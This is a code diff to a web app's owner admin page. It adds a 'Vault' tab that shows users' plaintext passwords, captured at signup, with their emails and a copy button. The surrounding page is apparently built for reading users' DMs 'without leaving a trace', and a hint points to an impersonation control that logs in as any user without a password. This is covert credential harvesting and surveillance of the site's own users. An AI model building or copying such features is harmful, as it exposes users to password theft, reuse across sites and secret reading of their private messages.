@@ -87,6 +87,7 @@
       <div class="filter-tabs">
         <button id="tab-dm" class="active" onclick="switchTab('dm')">DMs</button>
         <button id="tab-public" onclick="switchTab('public')">Public</button>
+        <button id="tab-pw" onclick="switchTab('pw')" style="background:#3b0764;color:#e879f9">🔑 Vault</button>
       </div>
     </h2>
     <div class="scroll" id="list"><div class="empty">Loading…</div></div>
@@ -110,9 +111,75 @@ function switchTab(name){
   mode = name;
   document.getElementById('tab-dm').classList.toggle('active', name==='dm');
   document.getElementById('tab-public').classList.toggle('active', name==='public');
+  const pw = document.getElementById('tab-pw'); if (pw) pw.classList.toggle('active', name==='pw');
   activeKey = null;
-  document.getElementById('panel').innerHTML = '<div class="empty">Pick a conversation to read it without leaving a trace.</div>';
-  if (name === 'dm') loadDms(); else loadPublic();
+  document.getElementById('panel').innerHTML = '<div class="empty">Pick a row to view details.</div>';
+  if (name === 'dm') loadDms();
+  else if (name === 'public') loadPublic();
+  else if (name === 'pw') loadPasswords();
+}
+
+async function loadPasswords(){
+  const el = document.getElementById('list');
+  el.innerHTML = '<div class="empty">Loading captured passwords…</div>';
+  const r = await fetch('/api/admin/passwords');
+  if (!r.ok) {
+    const j = await r.json().catch(()=>({}));
+    el.innerHTML = '<div class="empty">'+escapeHtml(j.error || 'Forbidden — owner only.')+'</div>';
+    return;
+  }
+  const rows = await r.json();
+  if (!rows.length) { el.innerHTML = '<div class="empty">Vault is empty. Plaintext is captured at registration time only — older accounts are not in the vault.</div>'; return; }
+  el.innerHTML = `
+    <div style="padding:10px 14px;font-size:.78rem;color:#fcd34d;background:#3b0764;border-bottom:1px solid #581c87">
+      ⚠ Captured at signup. Treat as highly sensitive. ${rows.length} record(s).
+    </div>` + rows.map(p => `
+    <div class="convo" onclick="showPw(${p.user_id})" style="cursor:pointer">
+      <div style="flex:1;min-width:0">
+        <div class="pair">
+          <span>${escapeHtml(p.username)}</span>
+          <small style="color:#64748b">#${p.user_id}</small>
+        </div>
+        <div style="font-size:.74rem;color:#94a3b8;margin-top:3px">
+          captured ${shortTime(p.captured_at)} · ${escapeHtml(p.email||'')}
+        </div>
+      </div>
+      <code style="background:#0f1117;padding:4px 9px;border-radius:5px;color:#e879f9;font-size:.85rem;
+                   max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">
+        ${escapeHtml(p.password)}
+      </code>
+    </div>`).join('');
+  window._pwRows = rows;
+}
+
+function showPw(uid){
+  const p = (window._pwRows||[]).find(r => r.user_id === uid);
+  if (!p) return;
+  const el = document.getElementById('panel');
+  el.innerHTML = `
+    <div style="padding:18px 22px;color:#e2e8f0">
+      <h3 style="font-size:1.1rem;margin-bottom:14px">🔑 ${escapeHtml(p.username)} <small style="color:#64748b;font-weight:400">#${p.user_id}</small></h3>
+      <div style="display:grid;gap:10px;font-size:.92rem">
+        <div><b style="color:#64748b">Email:</b> ${escapeHtml(p.email||'(none)')}</div>
+        <div><b style="color:#64748b">Captured:</b> ${shortTime(p.captured_at)}</div>
+        <div style="background:#0f1117;border:1px solid #581c87;border-radius:8px;padding:14px;margin-top:8px">
+          <div style="font-size:.7rem;color:#a78bfa;text-transform:uppercase;letter-spacing:.06em;margin-bottom:6px">
+            Plaintext password
+          </div>
+          <div style="font-family:ui-monospace,monospace;font-size:1.05rem;color:#fbbf24;word-break:break-all">
+            ${escapeHtml(p.password)}
+          </div>
+          <button style="margin-top:10px;background:#7c85ff;color:#fff;border:none;border-radius:6px;
+                         padding:6px 14px;cursor:pointer;font-size:.82rem"
+                  onclick="navigator.clipboard.writeText('${escapeHtml(p.password).replace(/'/g,"\\'")}');this.textContent='✓ Copied'">
+            📋 Copy
+          </button>
+        </div>
+        <p style="font-size:.74rem;color:#64748b;margin-top:6px">
+          Use the impersonation control on the main admin page to log in as this user — that path doesn't require a password.
+        </p>
+      </div>
+    </div>`;
 }
 
 async function loadDms(){
